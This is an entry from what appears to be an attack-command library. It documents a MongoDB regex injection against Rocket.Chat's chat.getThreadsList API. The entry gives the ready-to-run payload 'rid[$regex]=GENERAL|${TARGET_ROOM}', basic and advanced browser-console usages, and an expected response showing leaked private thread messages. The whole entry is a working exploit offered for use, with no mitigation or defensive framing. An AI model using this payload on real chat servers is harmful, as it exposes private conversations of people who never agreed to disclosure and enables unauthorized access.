---
data: 'fetchApi("chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM}")'
tags:
  - api
  - injection
  - rocket-chat
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.560Z'
id: dd8189b3-8ab5-4e9f-8941-3bc1805622b8
verified: false
validated: true
submitted: true
---
# rocket-chat-fetch-threads-list-regex

## Command

```javascript
fetchApi("chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM}")
```

## Description

Executes a GET request to Rocket.Chat's chat.getThreadsList API endpoint using a malicious regex in the 'rid' parameter to inject and leak private threads by matching multiple rooms.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rid[$regex] | Regex pattern like 'GENERAL|${TARGET_ROOM}' to match public and private room IDs | Yes |
| ${TARGET_ROOM} | Placeholder for the private room ID string | Yes |

## Examples

### Basic Usage

```javascript
fetchApi("chat.getThreadsList?rid[$regex]=GENERAL|privateABC123")
```

### Advanced Usage

In browser console after login; assumes fetchApi is a wrapper for authenticated requests.

```javascript
fetchApi("chat.getThreadsList?rid[$regex]=^GENERAL|privateABC123&count=100")
```

## Expected Output

JSON response: {"threads": [{"_id": "thread1", "rid": "privateABC123", "msg": "sensitive info", "ts": {...}, "u": {"_id": "user1"}}], "success": true} including leaked private data.

## Related

- [[Related Procedure|procedures/Exploit-MongoDB-Injection-with-Regex-on-rid]]
